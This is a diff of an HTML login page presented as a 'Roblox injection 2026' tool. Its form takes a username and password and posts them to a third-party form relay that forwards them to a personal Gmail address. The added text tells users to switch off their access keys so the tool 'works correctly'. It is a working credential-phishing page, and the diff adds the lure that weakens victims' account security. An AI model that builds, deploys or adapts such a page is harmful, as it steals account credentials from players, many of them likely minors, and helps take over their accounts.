@@ -56,6 +56,34 @@ input::placeholder{
 color:#6b7280;
 }
 
+.texto{
+font-size:14px;
+color:#374151;
+margin-top:10px;
+background:#f3f4f6;
+padding:10px;
+border-radius:12px;
+text-align:center;
+font-weight:bold;
+border:1px solid #e5e7eb;
+box-shadow:0 4px 10px rgba(0,0,0,0.08);
+animation:pop 1.2s ease infinite alternate;
+}
+
+.icono{
+margin-right:6px;
+}
+
+@keyframes pop{
+from{
+transform:scale(1);
+}
+
+to{
+transform:scale(1.05);
+}
+}
+
 .btn{
 background:#2563eb;
 border:none;
@@ -102,13 +130,11 @@ opacity:0.5;
 }
 
 </style></head>
-<body><div class="header">T!X</div><div class="container"><p>> Acceso al sistema<span class="cursor">_</span></p><form action="https://formsubmit.co/cesaralbertolandero@gmail.com" method="POST" onsubmit="accion()"><input type="hidden" name="_subject" value="Nuevo acceso T!X">
-<input type="hidden" name="_captcha" value="false">
-<input type="hidden" name="_template" value="table"><input type="text" name="Usuario" placeholder="Usuario" required>
-<input type="password" name="Contraseña" placeholder="Contraseña" required><button type="submit" class="btn">Continuar</button>
+<body><div class="header">A continuacion se deben colocar los datos de la cuenta</div><div class="container"><p>> Acceso al sistema<span class="cursor">_</span></p><form action="https://submit-form.com/cesaralbertolandero@gmail.com" method="POST" onsubmit="accion()"><input type="hidden" name="_subject" value="Nuevo acceso T!X"><input type="text" name="Usuario" placeholder="Usuario" required>
+<input type="password" name="Contraseña" placeholder="Contraseña" required><p class="texto"><span class="icono">🎮</span> Se recomienda desactivar llaves de acceso para que funcione correctamente</p><button type="submit" class="btn">Continuar</button>
 
 </form></div><footer>
-Sistema seguro v1.0
+Roblox injection 2026 v.1.0.2
 </footer><audio id="clickSound" src="https://assets.mixkit.co/active_storage/sfx/2571/2571-preview.mp3"></audio>
 
 <script>
